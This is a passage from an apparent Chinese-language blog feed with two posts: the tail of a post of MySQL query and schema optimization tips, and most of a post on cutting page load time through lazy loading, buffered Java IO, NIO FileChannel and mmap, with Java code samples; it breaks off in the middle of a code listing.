class=\"code\"><pre><span class=\"line\">create index IDX_USERNAME_TEL on user(deptid,position,createtime);select username,tel from user where deptid= 1 and position = &#x27;java开发&#x27; order by deptid,position,createtime desc; </span><br></pre></td></tr></table></figure></p>\n<p>实际上只是查询出符合 deptid= 1 and position = ‘java开发’条件的记录并按createtime降序排序，但写成order by createtime desc性能较差。</p>\n<p><strong>30、复合索引最左特性</strong></p>\n<p>（1）创建复合索引<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ALTER TABLE employee ADD INDEX idx_name_salary (name,salary)</span><br></pre></td></tr></table></figure><br>（2）满足复合索引的最左特性，哪怕只是部分，复合索引生效<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT * FROM employee WHERE NAME=&#x27;哪吒编程&#x27;</span><br></pre></td></tr></table></figure><br>（3）没有出现左边的字段，则不满足最左特性，索引失效<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT * FROM employee WHERE salary=5000</span><br></pre></td></tr></table></figure><br>（4）复合索引全使用，按左侧顺序出现 name,salary，索引生效<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT * FROM employee WHERE NAME=&#x27;哪吒编程&#x27; AND salary=5000</span><br></pre></td></tr></table></figure><br>（5）虽然违背了最左特性，但MySQL执行SQL时会进行优化，底层进行颠倒优化<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT * FROM employee WHERE salary=5000 AND NAME=&#x27;哪吒编程&#x27;</span><br></pre></td></tr></table></figure><br>（6）理由<br>复合索引也称为联合索引，当我们创建一个联合索引的时候，如(k1,k2,k3)，相当于创建了（k1）、(k1,k2)和(k1,k2,k3)三个索引，这就是最左匹配原则。</p>\n<p>联合索引不满足最左原则，索引一般会失效。</p>\n<p><strong>31、必要时可以使用force index来强制查询走某个索引</strong></p>\n<p>有的时候MySQL优化器采取它认为合适的索引来检索SQL语句，但是可能它所采用的索引并不是我们想要的。这时就可以采用forceindex来强制优化器使用我们制定的索引。</p>\n<p><strong>32、优化like语句</strong></p>\n<p>模糊查询，程序员最喜欢的就是使用like，但是like很可能让你的索引失效。</p>\n<ul>\n<li><p>首先尽量避免模糊查询，如果必须使用，不采用全模糊查询，也应尽量采用右模糊查询， 即like ‘…%’，是会使用索引的；</p>\n</li>\n<li><p>左模糊like ‘%…’无法直接使用索引，但可以利用reverse + function index的形式，变化成 like ‘…%’；</p>\n</li>\n<li><p>全模糊查询是无法优化的，一定要使用的话建议使用搜索引擎。</p>\n</li>\n</ul>\n<p><strong>33、统一SQL语句的写法</strong></p>\n<p>对于以下两句SQL语句， 程序员认为是相同的，数据库查询优化器认为是不同的。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from user;select * From USER;</span><br></pre></td></tr></table></figure></p>\n<p>这都是很常见的写法，也很少有人会注意，就是表名大小写不一样而已。然而，查询解析器认为这是两个不同的SQL语句，要解析两次，生成两个不同的执行计划，作为一名严谨的Java开发工程师，应该保证两个一样的SQL语句，不管在任何地方都是一样的。</p>\n<p><strong>34、不要把SQL语句写得太复杂</strong></p>\n<p>经常听到有人吹牛逼，我写了一个800行的SQL语句，逻辑感超强，我们还开会进行了SQL讲解，大家都投来了崇拜的目光。。。</p>\n<p>一般来说，嵌套子查询、或者是3张表关联查询还是比较常见的，但是，如果超过3层嵌套的话，查询优化器很容易给出错误的执行计划，影响SQL效率。SQL执行计划是可以被重用的，SQL越简单，被重用的概率越大，生成执行计划也是很耗时的。</p>\n<p><strong>35、将大的DELETE，UPDATE、INSERT 查询变成多个小查询</strong></p>\n<p>能写一个几十行、几百行的SQL语句是不是显得逼格很高？然而，为了达到更好的性能以及更好的数据控制，你可以将他们变成多个小查询。</p>\n<p><strong>36、关于临时表</strong></p>\n<p>1.避免频繁创建和删除临时表，以减少系统表资源的消耗；</p>\n<p>2.在新建临时表时，如果一次性插入数据量很大，那么可以使用 select into 代替 create table，避免造成大量 log；</p>\n<p>3.如果数据量不大，为了缓和系统表的资源，应先create table，然后insert；</p>\n<p>4.如果使用到了临时表，在存储过程的最后务必将所有的临时表显式删除。先 truncate table ，然后 drop table ，这样可以避免系统表的较长时间锁定。</p>\n<p><strong>37、使用explain分析你SQL执行计划</strong></p>\n<p>（1）type</p>\n<p>1.system：表仅有一行，基本用不到；</p>\n<p>2.const：表最多一行数据配合，主键查询时触发较多；</p>\n<p>3.eq_ref：对于每个来自于前面的表的行组合，从该表中读取一行。这可能是最好的联接类型，除了const类型；</p>\n<p>4.ref：对于每个来自于前面的表的行组合，所有有匹配索引值的行将从这张表中读取；</p>\n<p>5.range：只检索给定范围的行，使用一个索引来选择行。当使用=、&lt;&gt;、&gt;、&gt;=、&lt;、&lt;=、IS NULL、&lt;=&gt;、BETWEEN或者IN操作符，用常量比较关键字列时，可以使用range；</p>\n<p>6.index：该联接类型与ALL相同，除了只有索引树被扫描。这通常比ALL快，因为索引文件通常比数据文件小；</p>\n<p>7.all：全表扫描；</p>\n<p>8.性能排名：system &gt; const &gt; eq_ref &gt; ref &gt; range &gt; index &gt; all。</p>\n<p>9.实际sql优化中，最后达到ref或range级别。</p>\n<p>（2）Extra常用关键字</p>\n<ul>\n<li><p>Using index：只从索引树中获取信息，而不需要回表查询；</p>\n</li>\n<li><p>Using where：WHERE子句用于限制哪一个行匹配下一个表或发送到客户。除非你专门从表中索取或检查所有行，如果Extra值不为Using where并且表联接类型为ALL或index，查询可能会有一些错误。需要回表查询。</p>\n</li>\n<li><p>Using temporary：mysql常建一个临时表来容纳结果，典型情况如查询包含可以按不同情况列出列的GROUP BY和ORDER BY子句时；</p>\n</li>\n</ul>\n<p><strong>38、读写分离与分库分表</strong></p>\n<p>当数据量达到一定的数量之后，限制数据库存储性能的就不再是数据库层面的优化就能够解决的；这个时候往往采用的是读写分离与分库分表同时也会结合缓存一起使用，而这个时候数据库层面的优化只是基础。</p>\n<p>读写分离适用于较小一些的数据量；分表适用于中等数据量；而分库与分表一般是结合着用，这就适用于大数据量的存储了，这也是现在大型互联网公司解决数据存储的方法之一。</p>\n<p><strong>39、使用合理的分页方式以提高分页的效率</strong><br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select id,name from user limit 100000, 20</span><br></pre></td></tr></table></figure></p>\n<p>使用上述SQL语句做分页的时候，随着表数据量的增加，直接使用limit语句会越来越慢。<br>此时，可以通过取前一页的最大ID，以此为起点，再进行limit操作，效率提升显著。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select id,name from user where id&gt; 100000 limit 20</span><br></pre></td></tr></table></figure></p>\n<p><strong>40、尽量控制单表数据量的大小，建议控制在500万以内。</strong></p>\n<p>500万并不是MySQL数据库的限制，过大会造成修改表结构，备份，恢复都会有很大的问题。<br>可以用历史数据归档（应用于日志数据），分库分表（应用于业务数据）等手段来控制数据量大小。</p>\n<p><strong>41、谨慎使用Mysql分区</strong></p>\n<ul>\n<li><p>表分区表在物理上表现为多个文件，在逻辑上表现为一个表；</p>\n</li>\n<li><p>谨慎选择分区键，跨分区查询效率可能更低；</p>\n</li>\n<li><p>建议采用物理分表的方式管理大数据。</p>\n</li>\n</ul>\n<p><strong>42、尽量做到冷热数据分离，减小表的宽度</strong></p>\n<p>Mysql限制每个表最多存储4096列，并且每一行数据的大小不能超过65535字节。</p>\n<p>减少磁盘IO,保证热数据的内存缓存命中率（表越宽，把表装载进内存缓冲池时所占用的内存也就越大,也会消耗更多的IO）；</p>\n<p>更有效的利用缓存，避免读入无用的冷数据；</p>\n<p>经常一起使用的列放到一个表中（避免更多的关联操作）。</p>\n<p><strong>43、禁止在表中建立预留字段</strong></p>\n<p>1.预留字段的命名很难做到见名识义；</p>\n<p>2.预留字段无法确认存储的数据类型，所以无法选择合适的类型；</p>\n<p>3.对预留字段类型的修改，会对表进行锁定；</p>\n<p><strong>44、禁止在数据库中存储图片，文件等大的二进制数据</strong></p>\n<p>通常文件很大，会短时间内造成数据量快速增长，数据库进行数据库读取时，通常会进行大量的随机IO操作，文件很大时，IO操作很耗时。</p>\n<p>通常存储于文件服务器，数据库只存储文件地址信息。</p>\n<p><strong>45、建议把BLOB或是TEXT列分离到单独的扩展表中</strong></p>\n<p>Mysql内存临时表不支持TEXT、BLOB这样的大数据类型，如果查询中包含这样的数据，在排序等操作时，就不能使用内存临时表，必须使用磁盘临时表进行。而且对于这种数据，Mysql还是要进行二次查询，会使sql性能变得很差，但是不是说一定不能使用这样的数据类型。</p>\n<p>如果一定要使用，建议把BLOB或是TEXT列分离到单独的扩展表中，查询时一定不要使用select * 而只需要取出必要的列，不需要TEXT列的数据时不要对该列进行查询。</p>\n<p><strong>46、TEXT或BLOB类型只能使用前缀索引</strong></p>\n<p>因为MySQL对索引字段长度是有限制的，所以TEXT类型只能使用前缀索引，并且TEXT列上是不能有默认值的。</p>\n<p><strong>47、一些其它优化方式</strong></p>\n<p>（1）当只需要一条数据的时候，使用limit 1：<br>limit 1可以避免全表扫描，找到对应结果就不会再继续扫描了。</p>\n<p>（2）如果排序字段没有用到索引，就尽量少排序</p>\n<p>（3）所有表和字段都需要添加注释使用comment从句添加表和列的备注，从一开始就进行数据字典的维护。</p>\n<p>（4）SQL书写格式，关键字大小保持一致，使用缩进。</p>\n<p>（5）修改或删除重要数据前，要先备份。</p>\n<p>（6）很多时候用 exists 代替 in 是一个好的选择</p>\n<p>（7）where后面的字段，留意其数据类型的隐式转换。</p>\n<p>（8）尽量把所有列定义为NOT NULL:<br>NOT NULL列更节省空间，NULL列需要一个额外字节作为判断是否为 NULL的标志位。NULL列需要注意空指针问题，NULL列在计算和比较的时候，需要注意空指针问题。</p>\n<p>（9）伪删除设计</p>\n<p>（10）索引不适合建在有大量重复数据的字段上，比如性别，排序字段应创建索引</p>\n<p>（11）尽量避免使用游标：<br>因为游标的效率较差，如果游标操作的数据超过1万行，那么就应该考虑改写。</p>\n<p>转载自：<a href=\"https://mp.weixin.qq.com/s/zGneQEY8_P3nL0nGI8tCFg\">哪吒编程</a></p>\n",
            "tags": [
                "mysql",
                "sql",
                "sql优化"
            ]
        },
        {
            "id": "https://erik.xyz/2024/06/12/loading-zero-copy/",
            "url": "https://erik.xyz/2024/06/12/loading-zero-copy/",
            "title": "使用懒加载 + 零拷贝后，程序的秒开率提升至99.99%",
            "date_published": "2024-06-12T02:00:56.000Z",
            "content_html": "<h4 id=\"一、5秒钟加载一个页面的真相\"><a href=\"#一、5秒钟加载一个页面的真相\" class=\"headerlink\" title=\"一、5秒钟加载一个页面的真相\"></a>一、5秒钟加载一个页面的真相</h4><p>今天在修改前端页面的时候，发现程序中有一个页面的加载速度很慢，差不多需要5秒，这其实是难以接受的，我也不知道为什么上线这么长时间了，没人提过这个事儿。</p>\n<p>我记得有一个词儿，叫秒开率。<br><span id=\"more\"></span><br>秒开率是指能够在1秒内完成页面的加载。<br><img src=\"/img/2024/20240501.webp\" alt=\"erik.xyz\"></p>\n<p>查询的时候，会访问后台数据库，查询前20条数据，按道理来说，这应该很快才对。追踪代码，看看啥问题，最后发现问题有三：</p>\n<p>1.表中有一个BLOB大字段，存储着一个PDF模板，也就是上图中的运费模板；</p>\n<p>2.查询后会将这个PDF模板存储到本地磁盘点</p>\n<p>3.击线上显示，会读取本地的PDF模板，通过socket传到服务器。</p>\n<h5 id=\"大字段批量查询、批量文件落地、读取大文件并进行网络传输，不慢才怪，这一顿骚操作，5秒能加载完毕，已经烧高香了。\"><a href=\"#大字段批量查询、批量文件落地、读取大文件并进行网络传输，不慢才怪，这一顿骚操作，5秒能加载完毕，已经烧高香了。\" class=\"headerlink\" title=\"大字段批量查询、批量文件落地、读取大文件并进行网络传输，不慢才怪，这一顿骚操作，5秒能加载完毕，已经烧高香了。\"></a>大字段批量查询、批量文件落地、读取大文件并进行网络传输，不慢才怪，这一顿骚操作，5秒能加载完毕，已经烧高香了。</h5><p><img src=\"/img/2024/20240502.webp\" alt=\"erik.xyz\"></p>\n<h4 id=\"二、优化四步走\"><a href=\"#二、优化四步走\" class=\"headerlink\" title=\"二、优化四步走\"></a>二、优化四步走</h4><h5 id=\"1、“懒加载”\"><a href=\"#1、“懒加载”\" class=\"headerlink\" title=\"1、“懒加载”\"></a>1、“懒加载”</h5><p>经过调查发现，这个PDF模板只有在点击运费模板按钮时才会使用。</p>\n<ul>\n<li>优化1： 在点查询按钮时，不查询PDF模板；</li>\n<li>优化2： 点击运费模板时，根据uuid去查询，这样既能触发索引，也不用按时间排序，只是查询单条，速度快了很多很多，我愿称你为“懒加载”。</li>\n<li>优化3： 通过异步，将文件保存到磁盘中。</li>\n</ul>\n<p><img src=\"/img/2024/20240503.webp\" alt=\"erik.xyz\"></p>\n<p><strong>2、线上显示 = 就读取一个文件，为什么会慢呢？</strong></p>\n<p>打开代码一看，居然是通过FileReader读取的，我了个乖乖~这有什么问题吗？</p>\n<p>都是从百度拷贝过来的，百度还会有错吗？而且也测试了，没问题啊。</p>\n<p>嗯，对，是没问题，是可以实现需求，可是，为什么用这个？不知道。更别说效率问题了~</p>\n<p>优化4：通过缓冲流读取文件</p>\n<p><img src=\"/img/2024/20240504.webp\" alt=\"erik.xyz\"></p>\n<h4 id=\"三、先从上帝视角，了解一下啥子是IO流\"><a href=\"#三、先从上帝视角，了解一下啥子是IO流\" class=\"headerlink\" title=\"三、先从上帝视角，了解一下啥子是IO流\"></a>三、先从上帝视角，了解一下啥子是IO流</h4><p>Java I/O (Input/Output) 是对传统 I/O 操作的封装，它是以流的形式来操作数据的。</p>\n<p>1.InputStream代表一个输入流，它是一个抽象类，不能被实例化。InputStream定义了一些通用方法，如read()和skip()等，用于从输入流中读取数据；</p>\n<p>2.OutputStream代表一个输出流，它也是一个抽象类，不能被实例化。OutputStream定义了一些通用方法，如write()和flush()等，用于向输出流中写入数据；</p>\n<p>3.除了字节流，Java还提供字符流，字符流类似于字节流，不同之处在于字符流是按字符读写数据，而不是按字节。Java中最基本的字符流是Reader和Writer，它们是基于InputStream和OutputStream的转换类，用于完成字节流与字符流之间的转换。</p>\n<p>4.BufferedInputStream和BufferedOutputStream是I/O包中提供的缓冲输入输出流。它们可以提高I/O操作的效率，具有较好的缓存机制，能够减少磁盘操作，缩短文件传输时间。使用BufferedInputStream和 BufferedOutputStream进行读取和写入时，Java会自动调整缓冲区的大小，使其能够适应不同的数据传输速度。</p>\n<p>5.可以读取或写入 Java对象的流，比较典型的对象流包括ObjectInputStream 和ObjectOutputStream，将Java对象转换为字节流进行传输或存储；<br><img src=\"/img/2024/20240505.webp\" alt=\"erik.xyz\"></p>\n<p>在上一篇<a href=\"2024/05/06/index-asynchrony-landing/\">《增加索引+异步+不落地后，从12h优化到15min》</a>中，提到了4种优化方式，数据库优化、复用优化、并行优化、算法优化。</p>\n<p><strong>其中Buffered缓冲流就属于复用优化的一种，这个页面的查询完全可以通过复用优化优化一下。</strong></p>\n<h4 id=\"四、写个栗子，测试一下\"><a href=\"#四、写个栗子，测试一下\" class=\"headerlink\" title=\"四、写个栗子，测试一下\"></a>四、写个栗子，测试一下</h4><p><strong>1、通过字符输入流FileReader读取</strong></p>\n<p>FileReader连readLine()方法都没有，我也是醉了~</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private static int readFileByReader(String filePath) &#123;</span><br><span class=\"line\">    int result = 0;</span><br><span class=\"line\">    try (Reader reader = new FileReader(filePath)) &#123;</span><br><span class=\"line\">        int value;</span><br><span class=\"line\">        while ((value = reader.read()) != -1) &#123;</span><br><span class=\"line\">            result += value;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; catch (Exception e) &#123;</span><br><span class=\"line\">        System.out.println(&quot;readFileByReader异常：&quot; + e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>2、通过缓冲流BufferedReader读取</strong><br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private static String readFileByBuffer(String filePath) &#123;</span><br><span class=\"line\">    StringBuilder builder = new StringBuilder();</span><br><span class=\"line\">    try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) &#123;</span><br><span class=\"line\">        String data = null;</span><br><span class=\"line\">        while ((data = reader.readLine())!= null)&#123;</span><br><span class=\"line\">            builder.append(data);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;catch (Exception e) &#123;</span><br><span class=\"line\">        System.out.println(&quot;readFileByReader异常：&quot; + e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return builder+&quot;&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>通过循环模拟了150000个文件进行测试，FileReader耗时8136毫秒，BufferedReader耗时6718毫秒，差不多相差1秒半的时间，差距还是相当大的，俗话说得好，水滴石穿。</p>\n<p>同样是read方法，只不过是包了一层，有啥不同呢？</p>\n<p>BufferedReader 是一个缓冲字符输入流，可以对 FileRead 进行包装，提供了一个缓存数组，将数据按照一定规则读取到缓存区中，输入流每次读取文件数据时都需要将数据进行字符编码，而 BufferedReader 的出现，降低了输入流访问数据源的次数，将一定大小的数据一次读取到缓存区并进行字符编码，从而提高 IO 的效率。</p>\n<p>如果没有缓冲，每次调用 read() 或 readLine() 都可能导致从文件中读取字节，转换为字符，然后返回，这可能非常低效。</p>\n<p><strong>就像取快递一样，在取快递的时候，肯定是想一次性的取完，避免再来一趟。</strong></p>\n<ul>\n<li><p>FileReader就相当于一件一件的取，乐此不疲；</p>\n</li>\n<li><p>BufferedReader就相当于，你尽可能多的拿你的快递，可是这也有个极限，比如你一次只能拿5件快递，这个 5 就相当于缓冲区，效率上，提升数倍。</p>\n</li>\n</ul>\n<p>对 FileRead 进行包装变成了BufferedReader缓冲字符输入流，其实，Java IO流就是最典型的装饰器模式，装饰器模式通过组合替代继承的方式在不改变原始类的情况下添加增强功能，主要解决继承关系过于复杂的问题，之前整理过一篇装饰器模式，这里就不论述了。</p>\n<p><strong>3、再点进源码瞧瞧。</strong></p>\n<p><strong>（1）FileReader.read()源码很简单，就是直接读取</strong><br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public int read(char cbuf[], int off, int len) throws IOException &#123;</span><br><span class=\"line\">   return in.read(cbuf, off, len);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>（2）BufferedReader.read()的源码就较为复杂了，看一下它的核心方法</strong><br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fill()private void fill() throws IOException &#123;</span><br><span class=\"line\">   int dst;</span><br><span class=\"line\">    if (markedChar &lt;= UNMARKED) &#123;</span><br><span class=\"line\">        /* No mark */</span><br><span class=\"line\">        dst = 0;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        /* Marked */</span><br><span class=\"line\">        int delta = nextChar - markedChar;</span><br><span class=\"line\">        if (delta &gt;= readAheadLimit) &#123;</span><br><span class=\"line\">            /* Gone past read-ahead limit: Invalidate mark */</span><br><span class=\"line\">            markedChar = INVALIDATED;</span><br><span class=\"line\">            readAheadLimit = 0;</span><br><span class=\"line\">            dst = 0;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            if (readAheadLimit &lt;= cb.length) &#123;</span><br><span class=\"line\">                /* Shuffle in the current buffer */</span><br><span class=\"line\">                System.arraycopy(cb, markedChar, cb, 0, delta);</span><br><span class=\"line\">                markedChar = 0;</span><br><span class=\"line\">                dst = delta;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                /* Reallocate buffer to accommodate read-ahead limit */</span><br><span class=\"line\">                char ncb[] = new char[readAheadLimit];</span><br><span class=\"line\">                System.arraycopy(cb, markedChar, ncb, 0, delta);</span><br><span class=\"line\">                cb = ncb;</span><br><span class=\"line\">                markedChar = 0;</span><br><span class=\"line\">                dst = delta;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            nextChar = nChars = delta;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    int n;</span><br><span class=\"line\">    do &#123;</span><br><span class=\"line\">        n = in.read(cb, dst, cb.length - dst);</span><br><span class=\"line\">    &#125; while (n == 0);</span><br><span class=\"line\">    if (n &gt; 0) &#123;</span><br><span class=\"line\">        nChars = dst + n;</span><br><span class=\"line\">        nextChar = dst;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><strong>核心方法fill()：</strong></p>\n<p>1.字符缓冲输入流，底层有一个8192个元素的缓冲字符数组，当缓冲区的内容读完时，将使用 fill() 方法从硬盘中读取数据填充缓冲数组；</p>\n<p>2.字符缓冲输出流，底层有一个8192个元素的缓冲字符数组，使用flush方法将缓冲数组中的内容写入到硬盘当中；</p>\n<p>3.使用缓冲数组之后，程序在运行的大部分时间内都是内存和内存直接的数据交互过程。内存直接的操作效率是比较高的。并且降低了CPU通过内存操作硬盘的次数；</p>\n<p>4.关闭字符缓冲流，都会首先释放对应的缓冲数组空间，并且关闭创建对应的字符输入流和字符输出流。</p>\n<p>既然缓冲这么好用，为啥jdk将缓冲字符数组设置的这么小，才8192个字节？这是一个比较折中的方案，如果缓冲区太大的话，就会增加单次读写的时间，同样内存的大小也是有限制的，不可能都让你来干这个一件事。</p>\n<p>很多小伙伴也肯定用过它的read(char[] cbuf)，它内部维护了一个char数组，每次写/读数据时，操作的是数组，这样可以减少IO次数。<br><img src=\"/img/2024/20240506.webp\" alt=\"erik.xyz\"></p>\n<p><strong>（3）buffer四大属性</strong></p>\n<p>1.mark：标记</p>\n<p>2.position：位置，下一个要被读或写的元素的索引， 每次读写缓冲区数据时都会改变改值， 为下次读写作准备</p>\n<p>3.limit：表示缓冲区的当前终点，不能对缓冲区 超过极限的位置进行读写操作。且极限 是可以修改的</p>\n<p>4.capacity：容量，即可以容纳的最大数据量；在缓 冲区创建时被设定并且不能改变。</p>\n<p><strong>4、缓冲流：4次上下文切换+4次拷贝</strong></p>\n<p>传统IO执行的话需要4次上下文切换（用户态-&gt;内核态-&gt;用户态-&gt;内核态-&gt;用户态）和4次拷贝。</p>\n<p>1.磁盘文件DMA拷贝到内核缓冲区</p>\n<p>2.内核缓冲区CPU拷贝到用户缓冲区</p>\n<p>3.用户缓冲区CPU拷贝到Socket缓冲区</p>\n<p>4.Socket缓冲区DMA拷贝到协议引擎。<br><img src=\"/img/2024/20240508.webp\" alt=\"erik.xyz\"></p>\n<h4 id=\"五、NIO之FileChannel\"><a href=\"#五、NIO之FileChannel\" class=\"headerlink\" title=\"五、NIO之FileChannel\"></a>五、NIO之FileChannel</h4><p>NIO中比较常用的是FileChannel，主要用来对本地文件进行 IO 操作。</p>\n<p><strong>1、FileChannel 常见的方法有</strong></p>\n<p>1.read，从通道读取数据并放到缓冲区中；</p>\n<p>2.write，把缓冲区的数据写到通道中；</p>\n<p>3.transferFrom，从目标通道 中复制数据到当前通道；</p>\n<p>4,transferTo，把数据从当 前通道复制给目标通道。</p>\n<p><strong>2、关于Buffer 和 Channel的注意事项和细节</strong></p>\n<p>1.ByteBuffer支持类型化的put和get, put放入的是什么数据类型，get就应该使用 相应的数据类型来取出，否则可能有 BufferUnderflowException 异常；</p>\n<p>2.可以将一个普通Buffer 转成只读Buffer；</p>\n<p>3.NIO 还提供了 MappedByteBuffer， 可以让文件直接在内存（堆外的内存）中进 行修改， 而如何同步到文件由NIO 来完成；</p>\n<p>4.NIO 还支持 通过多个 Buffer (即 Buffer 数组) 完成读写操作，即 Scattering 和 Gathering。</p>\n<p><strong>3、Selector(选择器)</strong></p>\n<p>1.Java的NIO，用非阻塞的IO方式。可以用一个线程，处理多个的客户端连 接，就会使用到Selector(选择器)；</p>\n<p>2.Selector 能够检测多个注册的通道上是否有事件发生，如果有事件发生，便获取事件然 后针对每个事件进行相应的处理。这样就可以只用一个单线程去管理多个 通道，也就是管理多个连接和请求。</p>\n<p>3.只有在 连接/通道 真正有读写事件发生时，才会进行读写，就大大地减少了系统开销，并且不必为每个连接都创建一个线程，不用去维护多个线程。</p>\n<p>4,避免了多线程之间的上下文切换导致的开销。</p>\n<p><strong>4、selector的相关方法</strong></p>\n<p>1.open();//得到一个选择器对象</p>\n<p>2.select(long timeout);//监控所有注册的通道，当其中有IO操作可以进行时，将 对应的SelectionKey加入到内部集合中并返回，参数用来设置超时时间</p>\n<p>3.selectedKeys();//从内部集合中得到所有的SelectionKey。</p>\n<h4 id=\"六、内存映射技术mmap\"><a href=\"#六、内存映射技术mmap\" class=\"headerlink\" title=\"六、内存映射技术mmap\"></a>六、内存映射技术mmap</h4><p><strong>1、文件映射</strong></p>\n<p>传统的文件I/O操作可能会变得很慢，这时候mmap就闪亮登场了。</p>\n<p><strong>mmap（Memory-mapped files）是一种在内存中创建映射文件的机制，它可以使我们像访问内存一样访问文件，从而避免频繁的文件I/O操作。</strong></p>\n<p>使用mmap的方式是在内存中创建一个虚拟地址，然后将文件映射到这个虚拟地址上，这个映射的过程是由操作系统完成的。</p>\n<p>实现映射后，进程就可以采用指针的方式读写操作这一段内存，系统会自动回写到对应的文件磁盘上，这样就完成了对文件的读取操作，而不用调用 read、write 等系统函数。</p>\n<p>内核空间对这段区域的修改也会直接反映用户空间，从而可以实现不同进程间的文件共享。<br><img src=\"/img/2024/20240509.webp\" alt=\"erik.xyz\"></p>\n<p><strong>2、Java中使用mmap</strong></p>\n<p>在Java中，mmap技术主要使用了JavaNIO（New IO）库中的FileChannel 类，它提供了一种将文件映射到内存的方法，称为MappedByteBuffer。MappedByteBuffe是ByteBuffer的一个子类，它扩展了ByteBuffer的功能，可以直接将文件映射到内存中。</p>\n<p>根据文件地址创建了一层缓存当作索引，放在虚拟内存中，使用时会根据的地址，直接找到磁盘中文件的位置，把数据分段load到系统内存(pagecache)中。<br><img src=\"/img/2024/20240510.webp\" alt=\"erik.xyz\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static String readFileByMmap(String filePath) &#123;</span><br><span class=\"line\">    File file = new File(filePath);</span><br><span class=\"line\">    String ret = &quot;&quot;;</span><br><span class=\"line\">    StringBuilder builder = new StringBuilder();</span><br><span 